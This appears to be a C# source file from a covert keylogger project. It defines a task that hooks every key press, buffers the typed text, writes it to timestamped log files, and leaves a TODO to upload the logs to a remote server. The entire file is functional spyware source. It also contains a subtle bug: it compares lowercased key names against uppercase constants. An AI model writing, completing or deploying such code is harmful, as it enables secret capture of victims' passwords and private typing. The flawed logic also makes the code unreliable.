using System;
using System.Text;
using System.IO;
using System.Windows.Forms;

namespace IDK {

    /// <summary>
    /// Key logger task that periodically reports tracked key presses
    /// </summary>
    class KeyLoggerTask : Task {

        // log file to which keys are currently logged
        private string CurrentLogFile;

        // string builder with typed words
        private StringBuilder Buffer;

        // max string buffer length measured in words
        private const int MAX_BUFFER_LENGTH = 50;

        // current string buffer length measured in words
        private int BufferLength;

        /// <summary>
        /// Class constructor
        /// </summary>
        public KeyLoggerTask() : base(Config.GetInstance().Settings.KEY_REPORT_INTERVAL) {
            KeyLogger logger = new KeyLogger();
            logger.AddCallback(KeyPressed);
            logger.StartWorker();
        }

        /// <summary>
        /// Callback method that gets called when a key is pressed
        /// </summary>
        /// <param name="code">code of the pressed key</param>
        private void KeyPressed(int code) {
            string keyString = ((Keys) code).ToString().ToLower();

            try {
                char character = char.Parse(keyString);

                if (char.IsLetterOrDigit(character) || char.IsPunctuation(character) || char.IsSymbol(character)) {
                    Buffer.Append(character);
                }
            } catch {
                // if an exception occurs it means it's not a single character
                switch (keyString) {
                    case "SPACE":
                        Buffer.Append(' ');
                        BufferLength++;
                        break;
                    case "RETURN":
                        Buffer.AppendLine();
                        BufferLength++;
                        break;
                    default:
                        Buffer.AppendLine();
                        Buffer.Append(keyString);
                        Buffer.AppendLine();
                        break;
                }

                if (BufferLength >= MAX_BUFFER_LENGTH) {
                    BufferLength = 0;
                    WriteBufferToFile();
                }
            }
        }

        /// <summary>
        /// Appends the content of the string buffer to the current log file
        /// </summary>
        private void WriteBufferToFile() {
            using (StreamWriter writer = File.AppendText(CurrentLogFile)) {
                writer.WriteLine(Buffer.ToString());
            }
        }

        /// <summary>
        /// Performs required initializations. Called before execution of the task
        /// </summary>
        public override void Initialize() {
            DirectoryInfo info = new DirectoryInfo("key_logs/");

            if (!info.Exists) {
                info.Create();
            }

            CreateLogFile();

            Buffer = new StringBuilder();
        }

        /// <summary>
        /// Creates a new key log file
        /// </summary>
        private void CreateLogFile() {
            DateTime now = DateTime.Now;
            CurrentLogFile = "key_logs/KEY_LOG_" + now.Year + "_" + now.Month + "_" + now.Day + "_" + 
                now.Hour + "_" + now.Minute + "_" + now.Second + "_" + now.Millisecond + ".txt";
            File.CreateText(CurrentLogFile).Close();
        }

        /// <summary>
        /// Gets called when a tracked key report needs to be sent to the server
        /// </summary>
        public override void Update() {
            // TODO: upload report file to the server and create a new log file
        }
    }
}
